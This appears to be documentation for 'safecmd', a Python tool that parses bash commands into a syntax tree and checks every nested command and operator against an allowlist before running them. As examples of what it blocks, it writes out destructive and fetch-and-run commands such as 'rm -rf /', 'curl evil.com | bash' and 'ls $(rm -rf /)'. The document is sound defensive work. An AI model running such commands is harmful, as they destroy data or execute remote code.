    "Running shell commands from untrusted sources—like LLM-generated code, user input, or third-party scripts—is risky. A command that looks innocent might contain hidden redirects, command substitutions, or dangerous flags that could modify or delete files, exfiltrate data, or worse.\n",
    "\n",
    "**safecmd** solves this by validating bash commands against an allowlist before execution. Instead of trying to blacklist dangerous patterns (which is error-prone and easy to bypass), safecmd uses a generous allowlist of read-only and easily-reverted commands that are safe to run.\n",
    "\n",
    "The key innovation is that safecmd uses a proper bash parser (`shfmt`) to build an AST (Abstract Syntax Tree) of your command. This means it correctly handles complex bash syntax—pipelines, command substitutions, subshells, heredocs, and more—extracting and validating every command, even nested ones, before anything executes.\n",
    "\n",
    "The result: you can safely run commands like `git log | grep \"fix\"` or `find . -name \"*.py\" | xargs cat` knowing that if someone tries to sneak in `rm -rf /` or `curl evil.com | bash`, it'll be blocked before it runs. This makes safecmd ideal for building LLM-powered CLI tools, interactive shells that accept user input, or automation pipelines that process untrusted scripts."

    "When you call `safe_run()`, safecmd doesn't just string-match or regex your command—it properly *parses* it. Here's what happens:\n",
    "\n",
    "**1. Parse the bash command into an AST**\n",
    "\n",
    "safecmd uses [`shfmt`](https://github.com/mvdan/sh), a robust bash parser written in Go, to convert your command string into a JSON Abstract Syntax Tree. This is the same parser used by shell formatters and linters, so it handles all the edge cases that trip up naive approaches: quoted strings, escaped characters, heredocs, nested substitutions, and more.\n",
    "\n",
    "For example, the command `echo \"hello\" | grep h` becomes a tree structure showing that there's a pipeline with two commands (`echo` and `grep`), each with their arguments properly identified.\n",
    "\n",
    "**2. Extract all commands recursively**\n",
    "\n",
    "safecmd walks the AST and extracts every command that would be executed—including commands hidden inside:\n",
    "- Pipelines (`cmd1 | cmd2`)\n",
    "- Command substitutions (`$(cmd)` or `` `cmd` ``)\n",
    "- Subshells (`(cmd)`)\n",
    "- Logical chains (`cmd1 && cmd2`, `cmd1 || cmd2`)\n",
    "\n",
    "This is crucial: a command like `ls $(rm -rf /)` looks like it starts with `ls`, but the nested `rm` would execute first. safecmd catches this because it extracts *all* commands from the AST.\n",
    "\n",
    "**3. Validate against the allowlist**\n",
    "\n",
    "Each extracted command is checked against `ok_cmds` using prefix matching. A simple entry like `'ls'` allows `ls`, `ls -la`, `ls /home`. A multi-word entry like `'git status'` only matches commands starting with those exact words—so `git status` is allowed but `git push` is not.\n",
    "\n",
    "Some commands also have a denied flags list. For instance, `find` is allowed, but if any argument matches `-exec`, `-delete`, or `-ok`, the command is rejected.\n",
    "\n",
    "**4. Validate operators**\n",
    "\n",
    "The operators used in the command (pipes, redirects, logical operators) are also checked. By default, `|`, `&&`, `||`, `;`, and `<` (input redirect) are allowed, but `>` and `>>` (output redirects) are blocked to prevent file writes.\n",
    "\n",
    "**5. Execute if safe**\n",
    "\n",
    "Only after all commands and operators pass validation does safecmd actually run the command. If anything fails validation, you get a `DisallowedCmd` or `DisallowedOps` exception—nothing executes."
